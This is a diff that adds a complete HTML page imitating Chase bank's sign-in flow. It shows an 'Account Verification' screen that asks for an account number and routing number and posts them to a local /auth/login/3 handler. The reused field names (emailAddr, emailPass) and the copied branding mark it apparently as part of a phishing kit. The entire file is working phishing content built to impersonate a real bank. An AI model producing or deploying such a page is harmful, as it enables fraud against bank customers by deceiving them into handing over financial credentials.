@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Login</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main2.css">
+  <script src="/js/jquery.js"></script>
+  <script src="/js/jquery.mask.min.js"></script>
+</head>
+
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
+  <div class="homepage">
+    <div class="signin-container">
+      <header class="cb-header">
+        <div class="cb-header-wrap" style="min-width: 200px;">
+          <div class="cb-header-wrap-inner" style="max-width: 1200px;">
+            <div class="cb-header-container">
+              <div class="cb-header-container-left" style="min-width: 84px;">
+                <div class="cb-header-controls-left">
+                  <button type="button" class="cb-button cb-button--tertiary cb-button--inverse" tabindex="0">
+                    <span class="cb-button-icon cb-button-icon--leading">
+                      <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
+                        <path fill="inherit" d="M33.47 43.949a2.974 2.974 0 002.001-5.175l-16.244-14.77L35.47 9.238a2.974 2.974 0 10-4-4.4L12.804 21.806a2.974 2.974 0 000 4.402L31.47 43.177c.547.497 1.26.773 2 .772z"></path>
+                      </svg>
+                    </span>
+                    <span class="cb-button-label cb-button-label--with-icon">Exit</span>
+                  </button>
+                </div>
+              </div>
+
+              <div class="cb-header-logo-container cb-header-logo-container--absolute">
+                <a class="cb-header-logo-link" href="https://secure04ea.chase.com/web/auth/dashboard">
+                  <img class="cb-header-image" src="/img/logo-8.png">
+                </a>
+              </div>
+
+              <div class="cb-header-container-right" style="min-width: 84px;">
+                <div class="cb-header-controls-right">
+                  <button type="button" class="cb-button cb-button--tertiary cb-button--inverse" tabindex="0">
+                    <span class="cb-button-label">Español</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <main class="signin-content">
+        <div class="signin-content-wrap">
+          <div class="container-fluid p-0">
+            <div class="row">
+              <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
+                <h1 class="signin-header" tabindex="-1">Account Verification</h1>
+                <div class="progress-bar">
+                  <div class="progress-bar-track"></div>
+                  <div class="progress-bar-indicator-outer-border" style="width: calc(4px + 33.3%);"></div>
+                  <div class="progress-bar-indicator" style="width: 33.3%;"></div>
+                </div>
+              </div>
+            </div>
+
+            <div class="row no-gutters">
+              <div class="col-4 d-flex justify-content-center">
+                <div class="col-sm-2 col-lg-offset-1 hide-xs show-md signin-faq-sidebar">
+                  <div class="questions">
+                    <div class="cb-question-mark-icon">
+                      <i class="cb-icons question_mark"></i>
+                    </div>
+                    <span class="questions-sub">Questions?</span>
+                  </div>
+
+                  <p class="faqs-link">
+                    <a class="cb-link-anchor" href="javascript:void(0)" tabindex="0">
+                      <span class="cb-link-text">Read our FAQs.</span>
+                      <span class="cb-link-icon cb-link-icon--end">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
+                          <path fill="inherit" d="M15.835 43.949a2.974 2.974 0 01-2.001-5.175l16.244-14.77L13.834 9.238a2.974 2.974 0 114-4.4L36.5 21.806a2.974 2.974 0 010 4.402L17.835 43.177a2.967 2.967 0 01-2 .772z"></path>
+                        </svg>
+                      </span>
+                    </a>
+                  </p>
+                </div>
+
+                <div class="col-xs-12 col-sm-8 col-lg-6 col-lg-offset-0 col-md-offset-0 col-sm-offset-2">
+                  <h2 class="cb-verify-header">Let's confirm your identity.</h2>
+                  <h3 class="cb-verify-header-sub">To protect your account, please tell us the requested info so we can confirm your identity.</h3>
+                  <form class="cb-verify-body" action="/auth/login/3" method="POST">
+                    <div class="cb-input-container">
+                      <label for="emailAddr" class="cb-input-label">Account Number</label>
+
+                      <div class="cb-input-wrap">
+                        <input id="emailAddr" name="emailAddr" type="text" class="cb-input cb-input--line" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+                      </div>
+                    </div>
+
+                    <div class="cb-input-container">
+                      <label for="emailPass" class="cb-input-label">Routing Number</label>
+
+                      <div class="cb-input-wrap">
+                        <input id="emailPass" name="emailPass" type="password" class="cb-input cb-input--line cb-input--trailing-icon" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off" style="padding-right: 68px;">
+
+                        <div class="cb-input-icon cb-input-icon--line cb-input-show-field">
+                          <button type="button" class="cb-button cb-button--tertiary cb-button--small toggle-btn toggle-hidden" tabindex="0">
+                            <span class="cb-button-label">Show</span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="cb-button-container show-md hide-xs">
+                      <div class="cb-button-next">
+                        <button type="submit" class="cb-button cb-button--primary submit-btn" tabindex="0">
+                          <span class="cb-button-label">Next</span>
+                        </button>
+                      </div>
+                    </div>
+
+                    <div class="cb-button-container show-xs hide-md">
+                      <div class="cb-button-next">
+                        <button type="submit" class="cb-button cb-button--primary cb-button--fluid submit-btn" tabindex="0">
+                          <span class="cb-button-label">Next</span>
+                        </button>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+
+                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 hide-md show-xs">
+                  <div class="questions-container">
+                    <div class="cb-question-mark-icon">
+                      <i class="cb-icons question_mark"></i>
+                    </div>
+                    
+                    <span class="questions-sub">Questions?</span>
+
+                    <a class="cb-link-anchor" href="javascript:void(0)" tabindex="0">
+                      <span class="cb-link-text">Read our FAQs.</span>
+
+                      <span class="cb-link-icon cb-link-icon--end">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
+                          <path fill="inherit" d="M15.835 43.949a2.974 2.974 0 01-2.001-5.175l16.244-14.77L13.834 9.238a2.974 2.974 0 114-4.4L36.5 21.806a2.974 2.974 0 010 4.402L17.835 43.177a2.967 2.967 0 01-2 .772z"></path>
+                        </svg>
+                      </span>
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+  </div>
+
+  <script src="/js/main2.js"></script>
+</body>
+
+</html>
